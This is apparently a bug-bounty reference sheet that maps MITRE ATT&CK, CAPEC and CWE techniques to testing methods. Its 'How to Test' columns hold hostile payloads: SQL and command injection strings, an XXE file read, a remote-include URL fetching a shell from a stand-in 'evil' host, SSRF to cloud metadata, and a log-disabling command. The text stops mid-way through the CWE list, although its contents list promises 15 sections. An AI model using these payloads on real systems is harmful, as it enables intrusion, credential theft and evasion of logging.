# ATTACK METHODS DATABASE
## Alpha's Complete Attack Knowledge Base

> **Version:** 2.0 | **Date:** 2026-04-18
> **Sources:** MITRE ATT&CK v14, CAPEC v3.9, CWE Top 25 (2023), OWASP Top 10 (2021), OWASP API Top 10 (2023), OWASP Mobile Top 10 (2024)
> **Purpose:** Every attack method that exists, documented and ready for the wolf pack.

---

# TABLE OF CONTENTS

1. [MITRE ATT&CK Enterprise Tactics & Techniques](#1-mitre-attck-enterprise-tactics--techniques)
2. [CAPEC Top 50 Attack Patterns](#2-capec-top-50-attack-patterns)
3. [CWE Top 50 Weaknesses](#3-cwe-top-50-weaknesses)
4. [OWASP Top 10 (2021)](#4-owasp-top-10-2021)
5. [OWASP API Security Top 10 (2023)](#5-owasp-api-security-top-10-2023)
6. [OWASP Mobile Top 10 (2024)](#6-owasp-mobile-top-10-2024)
7. [Cross-Reference Matrix](#7-cross-reference-matrix)
8. [Advanced Network Attacks](#8-advanced-network-attacks) — 33 methods (Protocol, TCP/IP, SSL/TLS, HTTP, DNS)
9. [Wireless & Bluetooth Attacks](#9-wireless--bluetooth-attacks) — 18 methods (WiFi, Bluetooth, NFC/RFID)
10. [Cryptographic Attacks](#10-cryptographic-attacks) — 23 methods (Block cipher, hash, timing, certificate)
11. [Hardware & IoT Attacks](#11-hardware--iot-attacks) — 23 methods (Firmware, embedded, IoT protocols, fault injection)
12. [Cloud-Specific Attacks](#12-cloud-specific-attacks) — 23 methods (AWS, Azure, GCP, Kubernetes)
13. [Advanced Web Attacks](#13-advanced-web-attacks) — 27 methods (Cache, smuggling, pollution, DOM)
14. [Binary & Memory Attacks](#14-binary--memory-attacks) — 16 methods (Overflow, ROP, bypass)
15. [Supply Chain & CI/CD Attacks](#15-supply-chain--cicd-attacks) — 14 methods (Dependencies, CI/CD, containers)

---

# 1. MITRE ATT&CK ENTERPRISE TACTICS & TECHNIQUES

## Tactic Overview

| ID | Tactic | Description |
|---|---|---|
| TA0043 | Reconnaissance | Gathering info to plan operations |
| TA0042 | Resource Development | Establishing resources for operations |
| TA0001 | Initial Access | Getting into the network |
| TA0002 | Execution | Running malicious code |
| TA0003 | Persistence | Maintaining foothold |
| TA0004 | Privilege Escalation | Gaining higher-level permissions |
| TA0005 | Defense Evasion | Avoiding detection |
| TA0006 | Credential Access | Stealing credentials |
| TA0007 | Discovery | Figuring out the environment |
| TA0008 | Lateral Movement | Moving through the environment |
| TA0009 | Collection | Gathering target data |
| TA0011 | Command and Control | Communicating with compromised systems |
| TA0010 | Exfiltration | Stealing data out |
| TA0040 | Impact | Manipulate, interrupt, or destroy systems |

---

## TA0043 — RECONNAISSANCE

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1595 | Active Scanning | Scanning IP blocks, vuln scanning target infrastructure | Network/Cloud | Nmap, Masscan, Shodan queries against scope |
| T1595.001 | Scanning IP Blocks | Systematically scanning ranges for live hosts | Network | Masscan for port discovery, then targeted Nmap |
| T1595.002 | Vulnerability Scanning | Running vuln scanners against target | Web/API/Network | Nuclei, Nikto, or custom wolves against endpoints |
| T1595.003 | Wordlist Scanning | Brute-forcing directories, subdomains, parameters | Web/API | ffuf, gobuster, custom wordlists for dirs/params |
| T1592 | Gather Victim Host Info | OS, hardware, software, patches, architecture | Network/Cloud | Banner grabbing, HTTP headers, Wappalyzer |
| T1592.001 | Hardware | Identifying physical hardware | Network | SNMP enumeration, banner analysis |
| T1592.002 | Software | Identifying running software and versions | Web/Network | HTTP Server headers, `/robots.txt`, error pages |
| T1592.004 | Client Configurations | Browser/client config details | Web | JavaScript analysis, feature detection |
| T1589 | Gather Victim Identity Info | Emails, credentials, names, roles | Web/API | OSINT, LinkedIn, GitHub commits, HaveIBeenPwned |
| T1589.001 | Credentials | Finding leaked/exposed credentials | Web/API | Credential stuffing lists, paste sites, GitHub dorks |
| T1589.002 | Email Addresses | Harvesting email addresses | Web | Hunter.io, theHarvester, Google dorks |
| T1590 | Gather Victim Network Info | DNS, IP ranges, network topology | Network/Cloud | DNS enumeration, whois, BGP, certificate transparency |
| T1590.001 | Domain Properties | WHOIS, registrar, DNS records | Web/Network | `dig`, `whois`, SecurityTrails, crt.sh |
| T1590.002 | DNS | DNS records, zone transfers | Network | `dig axfr`, `dnsenum`, subdomain brute force |
| T1590.004 | Network Topology | Mapping internal network layout | Network | Traceroute, CDN detection, reverse DNS |
| T1591 | Gather Victim Org Info | Business relationships, org structure, locations | Web | LinkedIn, Crunchbase, SEC filings, job postings |
| T1593 | Search Open Websites/Domains | Using public sites for recon | Web | Google dorks, GitHub search, Wayback Machine |
| T1593.001 | Social Media | Mining social media for intel | Web | LinkedIn, Twitter, employee posts with tech details |
| T1593.002 | Search Engines | Using search engines for target info | Web | Google dorks: `site:target.com filetype:pdf` |
| T1593.003 | Code Repositories | Searching public repos for secrets | Web/API | GitHub/GitLab search for API keys, `.env` files |
| T1596 | Search Open Technical DBs | Scanning Shodan, Censys, public DBs | Network/Cloud | Shodan `org:target`, Censys, FOFA queries |
| T1597 | Search Closed Sources | Threat intel, dark web, paid DBs | All | Recorded Future, IntelX, dark web monitoring |
| T1598 | Phishing for Information | Social engineering for credentials/info | Web | Pretexting, spear-phishing (out of scope for bounty) |

---

## TA0001 — INITIAL ACCESS

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1190 | Exploit Public-Facing Application | Exploiting vulns in internet-facing apps | Web/API/Cloud | SQLi, RCE, SSRF, deserialization against live endpoints |
| T1133 | External Remote Services | Exploiting VPN, RDP, SSH, Citrix | Network | Brute force, default creds, CVE exploits on VPN/RDP |
| T1078 | Valid Accounts | Using legitimate credentials | Web/API/Cloud | Credential stuffing, default creds, leaked creds |
| T1078.001 | Default Accounts | Factory default credentials | Web/Network | admin:admin, test:test, known defaults per product |
| T1078.004 | Cloud Accounts | Compromised cloud identities | Cloud | AWS key leaks, Azure token theft, GCP SA key exposure |
| T1189 | Drive-by Compromise | Exploiting browser via malicious site | Web | XSS chains leading to credential theft |
| T1195 | Supply Chain Compromise | Compromising upstream dependencies | Web/API | Dependency confusion, typosquatting, malicious packages |
| T1195.001 | Compromise Software Dependencies | Poisoning libraries/packages | Web/API | Check for unpinned deps, lockfile manipulation |
| T1195.002 | Compromise Software Supply Chain | Infecting build pipelines | Cloud | CI/CD pipeline injection, build system compromise |
| T1199 | Trusted Relationship | Abusing partner/vendor access | Cloud/API | Third-party integrations, OAuth app abuse |
| T1566 | Phishing | Malicious emails/messages | Web | (Social engineering — typically out of bounty scope) |
| T1566.002 | Spearphishing Link | Targeted malicious links | Web | Craft convincing phishing pages (authorized tests only) |

---

## TA0002 — EXECUTION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1059 | Command and Scripting Interpreter | Executing commands via interpreters | Web/API/Cloud | OS command injection via user input fields |
| T1059.001 | PowerShell | Executing PowerShell commands | Network | Test for PS injection in Windows-facing apps |
| T1059.003 | Windows Command Shell | cmd.exe execution | Network | Command injection: `; whoami`, `| dir` |
| T1059.004 | Unix Shell | Bash/sh execution | Web/API | `; id`, `` `whoami` ``, `$(cat /etc/passwd)` |
| T1059.006 | Python | Python code execution | Web/API | `__import__('os').system('id')` in eval contexts |
| T1059.007 | JavaScript | JS execution server-side | Web/API | Node.js injection, SSTI in JS template engines |
| T1059.009 | Cloud API | Executing via cloud APIs | Cloud | AWS CLI abuse, Azure PowerShell, GCP gcloud |
| T1203 | Exploitation for Client Execution | Exploiting client software bugs | Web | Browser exploits, PDF exploits, Office macro (out of typical scope) |
| T1047 | Windows Management Instrumentation | WMI for execution | Network | WMI queries via compromised endpoints |
| T1204 | User Execution | Tricking users into running code | Web | Social engineering, malicious file upload |
| T1204.001 | Malicious Link | User clicks malicious link | Web | XSS links, open redirect chains |
| T1204.002 | Malicious File | User opens malicious file | Web | SVG upload with JS, HTML file upload, polyglots |
| T1610 | Deploy Container | Deploying malicious containers | Cloud | Kubernetes pod creation, Docker socket abuse |
| T1648 | Serverless Execution | Abusing serverless functions | Cloud | Lambda injection, Azure Functions abuse |

---

## TA0003 — PERSISTENCE

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1098 | Account Manipulation | Modifying accounts for persistence | Web/API/Cloud | Add SSH keys, change email, add MFA device to victim |
| T1098.001 | Additional Cloud Credentials | Adding cloud API keys | Cloud | Create new AWS access key, Azure service principal |
| T1098.003 | Additional Cloud Roles | Assigning roles for persistence | Cloud | IAM role attachment, GCP role binding |
| T1136 | Create Account | Creating new accounts | Web/API/Cloud | Self-registration bypass, admin account creation |
| T1136.001 | Local Account | Creating OS-level accounts | Network | `net user /add` via RCE |
| T1136.003 | Cloud Account | Creating cloud IAM users | Cloud | `aws iam create-user` via compromised creds |
| T1505 | Server Software Component | Implanting web shells, modules | Web | Web shell upload, malicious plugin install |
| T1505.003 | Web Shell | Uploading web shell for persistence | Web | Upload .php/.jsp/.aspx shell via file upload vuln |
| T1505.004 | IIS Components | Malicious IIS modules | Web | IIS module injection (requires server access) |
| T1556 | Modify Authentication Process | Tampering with auth mechanisms | Web/API | OAuth flow manipulation, SAML response modification |
| T1556.006 | Multi-Factor Authentication | Bypassing/disabling MFA | Web/API | MFA fatigue, response manipulation, backup code abuse |
| T1556.009 | Conditional Access Policies | Bypassing conditional access | Cloud | User-agent spoofing, IP allowlist bypass |
| T1078 | Valid Accounts | Using stolen creds for persistence | All | Maintain access via legitimate credentials |
| T1053 | Scheduled Task/Job | Creating scheduled tasks | Network/Cloud | Cron jobs, cloud scheduled functions |
| T1053.007 | Container Orchestration Job | Kubernetes CronJobs | Cloud | Create K8s CronJob for persistent execution |

---

## TA0004 — PRIVILEGE ESCALATION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1548 | Abuse Elevation Control Mechanism | Bypassing privilege controls | Web/API/Cloud | IDOR to admin, role parameter manipulation |
| T1548.002 | Bypass User Account Control | UAC bypass | Network | (OS-level, rarely in-scope for web bounty) |
| T1548.005 | Temporary Elevated Cloud Access | Abusing temporary token escalation | Cloud | AWS AssumeRole chains, GCP impersonation |
| T1078 | Valid Accounts | Using higher-priv stolen accounts | All | Credential reuse, admin account takeover |
| T1078.004 | Cloud Accounts | Cloud admin credential abuse | Cloud | Pivot from dev to prod via shared creds |
| T1068 | Exploitation for Privilege Escalation | Exploiting software vulns for privesc | All | Kernel exploits, container escape, app-level privesc |
| T1134 | Access Token Manipulation | Forging/stealing tokens | Web/API/Cloud | JWT manipulation, OAuth token theft, SAML forging |
| T1134.001 | Token Impersonation/Theft | Stealing and reusing tokens | Web/API | Session hijacking, token replay |
| T1611 | Escape to Host | Container breakout | Cloud | Container escape via mounted Docker socket, CVEs |
| T1484 | Domain/Tenant Policy Modification | Modifying domain policies | Cloud | Azure AD policy modification, conditional access bypass |
| T1484.002 | Trust Modification | Modifying trust relationships | Cloud | Federation trust manipulation |
| T1574 | Hijack Execution Flow | DLL hijacking, path interception | Network | DLL sideloading, LD_PRELOAD injection |

---

## TA0005 — DEFENSE EVASION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1027 | Obfuscated Files or Information | Encoding/encrypting payloads | Web/API | Base64 encode payloads, Unicode normalization bypass |
| T1027.010 | Command Obfuscation | Obfuscating commands to bypass filters | Web | `w\h\o\a\m\i`, `$(printf '\x69\x64')`, case toggling |
| T1070 | Indicator Removal | Clearing logs and artifacts | Network/Cloud | Log deletion, CloudTrail tampering |
| T1070.004 | File Deletion | Removing files to cover tracks | Network | Delete uploaded shells after use |
| T1078 | Valid Accounts | Using legit accounts to blend in | All | Actions under legitimate user context |
| T1036 | Masquerading | Making things look legitimate | Web/API | Rename payloads to look benign, spoof content-type |
| T1036.005 | Match Legitimate Name or Location | Naming files to match expected patterns | Web | Upload shell as `update.php` or `config.bak` |
| T1562 | Impair Defenses | Disabling security tools | Cloud/Network | Disable WAF rules, turn off logging, kill EDR |
| T1562.001 | Disable or Modify Tools | Turning off security software | Network | AV evasion, EDR tampering |
| T1562.007 | Disable or Modify Cloud Firewall | Modifying cloud security groups | Cloud | Open SG rules, modify NACLs |
| T1562.008 | Disable or Modify Cloud Logs | Turning off CloudTrail/Stackdriver | Cloud | `aws cloudtrail stop-logging` |
| T1550 | Use Alternate Authentication Material | Non-password auth abuse | Web/API/Cloud | Pass-the-hash, pass-the-ticket, stolen JWT/cookie |
| T1550.001 | Application Access Token | Using stolen OAuth/API tokens | Web/API/Cloud | Reuse bearer tokens, API keys from JS files |
| T1218 | System Binary Proxy Execution | Using trusted binaries for execution | Network | LOLBins: certutil, mshta, regsvr32 |
| T1480 | Execution Guardrails | Environment-specific triggers | All | (Defense technique, less relevant for testing) |
| T1556 | Modify Authentication Process | Subverting auth checks | Web/API | Parameter manipulation to bypass auth |
| T1600 | Weaken Encryption | Downgrading encryption | Network | SSL downgrade attacks, cipher suite manipulation |

---

## TA0006 — CREDENTIAL ACCESS

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1110 | Brute Force | Trying many passwords | Web/API | Credential stuffing, password spraying |
| T1110.001 | Password Guessing | Guessing passwords | Web/API | Common passwords against login endpoints |
| T1110.002 | Password Cracking | Offline hash cracking | Network | Crack hashes found in exposed DBs/backups |
| T1110.003 | Password Spraying | One password, many accounts | Web/API | `Password1!` across all discovered emails |
| T1110.004 | Credential Stuffing | Leaked creds against target | Web/API | Breach databases against login endpoints |
| T1539 | Steal Web Session Cookie | Stealing session tokens | Web | XSS + `document.cookie`, cookie theft via MITM |
| T1528 | Steal Application Access Token | Stealing OAuth/API tokens | Web/API/Cloud | Token leakage in URL, referer, JS source, logs |
| T1552 | Unsecured Credentials | Finding plaintext credentials | Web/API/Cloud | `.env` files, config files, hardcoded creds in JS |
| T1552.001 | Credentials In Files | Creds in config/source files | Web/API | Search repos for passwords, API keys in JS bundles |
| T1552.005 | Cloud Instance Metadata API | AWS/GCP metadata service | Cloud | SSRF to `169.254.169.254` for IAM creds |
| T1552.007 | Container API | Kubernetes secrets, Docker env | Cloud | `/var/run/secrets/`, K8s API server queries |
| T1555 | Credentials from Password Stores | Extracting saved passwords | Network | Browser password extraction, keychain access |
| T1557 | Adversary-in-the-Middle | Intercepting auth traffic | Network | ARP spoofing, DNS poisoning, SSL stripping |
| T1557.003 | DHCP Spoofing | Rogue DHCP for MITM | Network | DHCP spoofing on local network |
| T1558 | Steal or Forge Kerberos Tickets | Kerberoasting, golden ticket | Network | Kerberoast service accounts, AS-REP roasting |
| T1558.003 | Kerberoasting | Requesting TGS for cracking | Network | `GetUserSPNs.py` for service account hashes |
| T1606 | Forge Web Credentials | Creating fake auth tokens | Web/API | JWT forging (none alg, key confusion, weak secret) |
| T1606.001 | Web Cookies | Forging session cookies | Web | Predictable session tokens, cookie signing bypass |
| T1606.002 | SAML Tokens | Forging SAML assertions | Web/Cloud | SAML response manipulation, signature wrapping |
| T1621 | Multi-Factor Authentication Request Generation | MFA bombing/fatigue | Web | Repeated MFA push requests (authorized testing only) |

---

## TA0007 — DISCOVERY

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1087 | Account Discovery | Enumerating user accounts | Web/API/Cloud | User enumeration via login/register/reset responses |
| T1087.004 | Cloud Account | Enumerating cloud users | Cloud | AWS IAM enumeration, Azure AD user listing |
| T1580 | Cloud Infrastructure Discovery | Mapping cloud resources | Cloud | S3 bucket enumeration, Azure blob discovery |
| T1538 | Cloud Service Dashboard | Accessing cloud consoles | Cloud | AWS Console access via stolen creds |
| T1526 | Cloud Service Discovery | Enumerating cloud services | Cloud | AWS service enumeration, GCP project discovery |
| T1046 | Network Service Scanning | Port scanning and service discovery | Network | Nmap TCP/UDP scans, service version detection |
| T1135 | Network Share Discovery | Finding accessible shares | Network | SMB enumeration, NFS exports |
| T1040 | Network Sniffing | Capturing network traffic | Network | Packet capture for credential harvesting |
| T1069 | Permission Groups Discovery | Enumerating groups/roles | Web/API/Cloud | GraphQL introspection, API role enumeration |
| T1057 | Process Discovery | Listing running processes | Network | Process listing via RCE |
| T1018 | Remote System Discovery | Identifying other hosts | Network | ARP scanning, DNS resolution, ping sweep |
| T1518 | Software Discovery | Identifying installed software | Web/Network | Tech stack fingerprinting, Wappalyzer, headers |
| T1082 | System Information Discovery | Gathering system details | All | Server headers, error messages, API version endpoints |
| T1016 | System Network Configuration Discovery | Network config details | Network | `ifconfig`, routing tables via RCE |
| T1049 | System Network Connections Discovery | Active connections | Network | `netstat`, `ss` via RCE |
| T1033 | System Owner/User Discovery | Identifying logged-in users | Web/Network | User profile endpoints, `whoami` via RCE |
| T1007 | System Service Discovery | Listing services | Network | Service enumeration via RCE |
| T1613 | Container and Resource Discovery | Kubernetes/Docker recon | Cloud | K8s API queries, Docker socket enumeration |
| T1619 | Cloud Storage Object Discovery | Enumerating cloud storage | Cloud | S3 listing, GCS bucket enumeration, Azure blob listing |

---

## TA0008 — LATERAL MOVEMENT

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1210 | Exploitation of Remote Services | Exploiting services to move | Network | EternalBlue, BlueKeep, Log4Shell on internal services |
| T1534 | Internal Spearphishing | Phishing internal users | Web | Account takeover then phish other users |
| T1570 | Lateral Tool Transfer | Moving tools between systems | Network | Upload tools via compromised hosts |
| T1021 | Remote Services | Using remote access protocols | Network | SSH, RDP, WinRM pivoting |
| T1021.001 | Remote Desktop Protocol | RDP lateral movement | Network | RDP with stolen creds |
| T1021.004 | SSH | SSH lateral movement | Network/Cloud | SSH key reuse, agent forwarding abuse |
| T1021.006 | Windows Remote Management | WinRM lateral movement | Network | `Enter-PSSession` with creds |
| T1550 | Use Alternate Authentication Material | Token/hash reuse for lateral movement | All | Pass-the-hash, pass-the-cookie |
| T1550.001 | Application Access Token | Reusing API tokens | Web/API/Cloud | Bearer token reuse across microservices |
| T1563 | Remote Service Session Hijacking | Hijacking active sessions | Network | Session stealing, RDP hijacking |

---

## TA0009 — COLLECTION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1530 | Data from Cloud Storage | Accessing cloud storage data | Cloud | Read S3 buckets, GCS objects, Azure blobs |
| T1213 | Data from Information Repositories | Extracting data from repos/wikis | Web/Cloud | SharePoint, Confluence, wiki scraping |
| T1213.003 | Code Repositories | Data from Git repos | Web/Cloud | GitHub/GitLab private repo access via stolen tokens |
| T1005 | Data from Local System | Collecting local files | Network | File read via LFI, path traversal |
| T1039 | Data from Network Shared Drive | Accessing shared storage | Network | SMB share enumeration and file access |
| T1114 | Email Collection | Accessing email systems | Web/Cloud | OWA access, Graph API email read |
| T1114.002 | Remote Email Collection | Reading email via API | Cloud | Microsoft Graph API, Gmail API with stolen OAuth |
| T1185 | Browser Session Hijacking | Injecting into browser sessions | Web | XSS to access same-origin resources |
| T1557 | Adversary-in-the-Middle | Intercepting data in transit | Network | Proxy interception, ARP spoofing |
| T1119 | Automated Collection | Scripted data gathering | All | Automated scraping, API enumeration scripts |

---

## TA0011 — COMMAND AND CONTROL

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1071 | Application Layer Protocol | C2 over HTTP/HTTPS/DNS | Network | HTTP-based C2 channels, DNS tunneling |
| T1071.001 | Web Protocols | C2 over HTTP/S | Web/Network | Reverse shell over HTTPS, WebSocket C2 |
| T1071.004 | DNS | C2 over DNS | Network | DNS tunneling, TXT record exfil |
| T1105 | Ingress Tool Transfer | Downloading tools to target | Network | `curl`, `wget`, `certutil` for payload delivery |
| T1572 | Protocol Tunneling | Tunneling through allowed protocols | Network | SSH tunneling, ICMP tunneling, DNS tunneling |
| T1090 | Proxy | Using proxies for C2 | Network | Multi-hop proxies, TOR, domain fronting |
| T1090.002 | External Proxy | External C2 proxies | Network | Cloud-hosted redirectors |
| T1090.004 | Domain Fronting | CDN abuse for C2 | Cloud | Using CDN domains to mask C2 traffic |
| T1102 | Web Service | C2 via legitimate web services | Web/Cloud | Slack/Discord/Telegram as C2 channels |
| T1568 | Dynamic Resolution | Dynamic C2 infrastructure | Network | DGA, DNS fast flux |
| T1573 | Encrypted Channel | Encrypted C2 comms | Network | Custom encryption, certificate pinning evasion |
| T1571 | Non-Standard Port | C2 on unusual ports | Network | HTTPS on port 8443, 4443, etc. |

---

## TA0010 — EXFILTRATION

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1048 | Exfiltration Over Alternative Protocol | Data theft via non-standard channels | Network | DNS exfil, ICMP exfil, SMTP exfil |
| T1048.002 | Exfiltration Over Asymmetric Encrypted Non-C2 Protocol | Exfil via HTTPS to external | Network/Cloud | Upload data to attacker-controlled HTTPS endpoint |
| T1567 | Exfiltration Over Web Service | Data theft via cloud services | Web/Cloud | Upload to S3, Google Drive, Dropbox, Pastebin |
| T1567.002 | Exfiltration to Cloud Storage | Upload stolen data to cloud | Cloud | AWS S3 upload, Azure blob upload |
| T1041 | Exfiltration Over C2 Channel | Data sent via C2 channel | Network | Embed data in C2 HTTP requests |
| T1029 | Scheduled Transfer | Timed data exfiltration | Network | Periodic automated data upload |
| T1537 | Transfer Data to Cloud Account | Move data between cloud accounts | Cloud | Copy S3 objects to attacker AWS account |
| T1020 | Automated Exfiltration | Scripted data theft | All | Auto-export via SSRF, API abuse |

---

## TA0040 — IMPACT

| ID | Technique | Description | Applies To | How to Test |
|---|---|---|---|---|
| T1485 | Data Destruction | Deleting data | Web/API/Cloud | Mass deletion via API (e.g., `delete_user` endpoint) |
| T1486 | Data Encrypted for Impact | Ransomware | Network | (Out of scope for bounty) |
| T1565 | Data Manipulation | Modifying data for impact | Web/API | Balance manipulation, order tampering, price change |
| T1565.001 | Stored Data Manipulation | Modifying stored records | Web/API | Change other users' profiles, modify transactions |
| T1565.002 | Transmitted Data Manipulation | Modifying data in transit | Network | MITM request tampering |
| T1491 | Defacement | Modifying web content | Web | Stored XSS, content injection, admin panel compromise |
| T1491.002 | External Defacement | Public-facing defacement | Web | Homepage modification via admin takeover |
| T1498 | Network Denial of Service | Flooding network | Network | (Typically out of scope) |
| T1499 | Endpoint Denial of Service | Crashing services | Web/API | ReDoS, resource exhaustion, zip bombs |
| T1499.003 | Application Exhaustion Flood | Overwhelming application logic | Web/API | Expensive GraphQL queries, unthrottled API loops |
| T1499.004 | Application or System Exploitation | Crashing via exploitation | Web/API | Crash via malformed input, null pointer triggers |
| T1496 | Resource Hijacking | Using target resources (crypto mining) | Cloud | Cryptojacking via compromised cloud instances |
| T1531 | Account Access Removal | Locking users out | Web/API | Password reset takeover, email change, MFA lock |
| T1657 | Financial Theft | Direct financial impact | Web/API | Unauthorized transactions, balance transfer |

---

# 2. CAPEC TOP 50 ATTACK PATTERNS

Attack patterns most relevant to bug bounty and penetration testing.

## Injection Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-66 | SQL Injection | Inject SQL via user input to query/modify database | Web/API | `' OR 1=1--`, `UNION SELECT`, blind boolean/time-based |
| CAPEC-88 | OS Command Injection | Execute OS commands via unsanitized input | Web/API | `; id`, `| whoami`, `` `cat /etc/passwd` `` |
| CAPEC-250 | XML Injection | Inject malicious XML into XML parsers | Web/API | XML entity manipulation, tag injection |
| CAPEC-228 | DTD Injection (XXE) | External entity injection in XML parsers | Web/API | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| CAPEC-242 | Code Injection | Inject and execute arbitrary code | Web/API | `eval()` injection, template injection (SSTI) |
| CAPEC-63 | Cross-Site Scripting (XSS) | Inject client-side scripts | Web | `<script>alert(1)</script>`, event handler injection |
| CAPEC-86 | XSS via HTTP Headers | XSS through HTTP header reflection | Web | Host header injection, Referer-based XSS |
| CAPEC-243 | XSS Targeting HTML Attributes | XSS via attribute injection | Web | `" onfocus=alert(1) autofocus="`, `'onmouseover='alert(1)` |
| CAPEC-244 | XSS Targeting URI Placeholders | XSS via javascript: URIs | Web | `javascript:alert(1)` in href, src, action |
| CAPEC-245 | XSS Using Doubled Characters | Bypass filters with double encoding | Web | `%253Cscript%253E`, recursive filter bypass |
| CAPEC-588 | DOM-Based XSS | Client-side DOM manipulation XSS | Web | `location.hash` sinks, `innerHTML` with user data |
| CAPEC-101 | Server Side Include (SSI) Injection | Inject SSI directives | Web | `<!--#exec cmd="id" -->` |
| CAPEC-135 | Format String Injection | Exploit format string vulnerabilities | Web/API | `%x%x%x%x`, `%n` in C-based backends |
| CAPEC-136 | LDAP Injection | Inject LDAP queries | Web/API | `*)(uid=*))(|(uid=*` in search fields |
| CAPEC-676 | NoSQL Injection | Inject into NoSQL databases | Web/API | `{"$gt":""}`, `{"$regex":".*"}` in MongoDB queries |

## Authentication & Authorization Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-114 | Authentication Abuse | Exploiting flaws in authentication | Web/API | Default creds, auth bypass, session fixation |
| CAPEC-115 | Authentication Bypass | Completely bypassing authentication | Web/API | Forced browsing, direct API calls, JWT `none` alg |
| CAPEC-122 | Privilege Abuse | Misusing legitimate privileges | Web/API | IDOR, accessing other users' resources |
| CAPEC-233 | Privilege Escalation | Gaining unauthorized higher privileges | Web/API | Role parameter tampering, admin endpoint access |
| CAPEC-560 | Use of Known Domain Credentials | Reusing breached credentials | Web/API | Credential stuffing from breach databases |
| CAPEC-561 | Windows Admin Shares | Accessing C$, ADMIN$ shares | Network | `net use \\target\C$` with admin creds |
| CAPEC-600 | Credential Stuffing | Automated credential reuse | Web/API | Large-scale login attempts with breached creds |
| CAPEC-16 | Dictionary-based Password Attack | Brute forcing with wordlists | Web/API | `rockyou.txt`, custom wordlists, rule-based mutations |
| CAPEC-49 | Password Brute Forcing | Exhaustive password guessing | Web/API | Hydra, Burp Intruder against login endpoints |
| CAPEC-196 | Session Credential Falsification | Forging session tokens | Web/API | Predictable session IDs, JWT secret cracking |

## Information Disclosure

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-116 | Excavation | Extracting hidden data from responses | Web/API | Verbose errors, debug endpoints, stack traces |
| CAPEC-127 | Directory Indexing | Browsing exposed directories | Web | `/`, `.listing`, directory traversal |
| CAPEC-170 | Web Application Fingerprinting | Identifying technology stack | Web | HTTP headers, error pages, default files |
| CAPEC-497 | File Discovery | Finding sensitive files | Web | `.env`, `backup.sql`, `.git/HEAD`, `wp-config.php` |
| CAPEC-118 | Collect and Analyze Information | OSINT and recon data gathering | All | GitHub dorks, Wayback Machine, certificate transparency |
| CAPEC-285 | ICMP Echo Request Ping | Host discovery | Network | Ping sweep, ICMP-based discovery |
| CAPEC-300 | Port Scanning | Identifying open ports | Network | Nmap SYN/TCP/UDP scans |

## Request Manipulation

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-12 | Choosing Message Identifier | Manipulating message/request IDs | Web/API | IDOR: change `user_id=123` to `user_id=124` |
| CAPEC-21 | Exploitation of Trusted Identifiers | Abusing trusted session/request IDs | Web/API | Cookie manipulation, token replay |
| CAPEC-22 | Exploiting Trust in Client | Server trusts client-side validation | Web/API | Bypass client-side price/quantity validation |
| CAPEC-31 | Accessing/Intercepting/Modifying HTTP Cookies | Cookie tampering | Web | Modify cookie values, steal via XSS |
| CAPEC-33 | HTTP Request Smuggling | Desync front/backend request parsing | Web | `Transfer-Encoding` + `Content-Length` conflicts |
| CAPEC-34 | HTTP Response Splitting | Inject headers into response | Web | CRLF injection: `%0d%0a` in headers |
| CAPEC-39 | Manipulating Opaque Client-based Data Tokens | Tampering with client tokens | Web/API | JWT manipulation, encrypted cookie attacks |
| CAPEC-57 | Utilizing REST's Trust in the System Resource to Obtain Sensitive Data | API abuse | API | Mass assignment, parameter pollution |
| CAPEC-62 | Cross Site Request Forgery (CSRF) | Force authenticated actions | Web | Auto-submitting forms, CSRF token bypass |
| CAPEC-126 | Path Traversal | Navigate outside web root | Web/API | `../../../etc/passwd`, `..%2F..%2F..%2F` |

## Server-Side Attacks

| ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|
| CAPEC-664 | Server Side Request Forgery (SSRF) | Force server to make requests | Web/API/Cloud | URL parameters fetching `http://169.254.169.254/` |
| CAPEC-17 | Using Malicious Files | Upload malicious files | Web | Web shells, polyglots, SVG XSS, XXE via docx |
| CAPEC-71 | Using Unicode Encoding to Bypass Validation | Unicode normalization bypass | Web/API | Homoglyph attacks, UTF-8 overlong encoding |
| CAPEC-76 | Manipulating Web Input to File System Calls | LFI/RFI | Web | `?page=../../etc/passwd`, `?file=http://evil/shell` |
| CAPEC-153 | Input Data Manipulation | Modifying input to cause unexpected behavior | Web/API | Parameter tampering, mass assignment, type juggling |
| CAPEC-460 | HTTP Parameter Pollution | Duplicate parameters confuse parsers | Web/API | `?id=1&id=2` — different parsing by front/backend |

---

# 3. CWE TOP 50 WEAKNESSES

## CWE Top 25 Most Dangerous (2023)

| Rank | CWE ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|---|
| 1 | CWE-787 | Out-of-bounds Write | Writing data past buffer boundaries | Network/Mobile | Fuzzing binary protocols, memory corruption |
| 2 | CWE-79 | Cross-site Scripting (XSS) | Improper neutralization of input in web output | Web | Inject `<script>`, event handlers, in all inputs |
| 3 | CWE-89 | SQL Injection | Improper neutralization of SQL commands | Web/API | `' OR 1=1--`, `UNION SELECT`, sqlmap |
| 4 | CWE-416 | Use After Free | Referencing memory after it is freed | Network | Fuzzing, memory corruption exploits |
| 5 | CWE-78 | OS Command Injection | Improper neutralization of OS commands | Web/API | `; id`, `| cat /etc/passwd` in all input fields |
| 6 | CWE-20 | Improper Input Validation | Failure to validate input properly | All | Boundary values, special chars, unexpected types |
| 7 | CWE-125 | Out-of-bounds Read | Reading data past buffer boundaries | Network | Heartbleed-style info leaks, fuzzing |
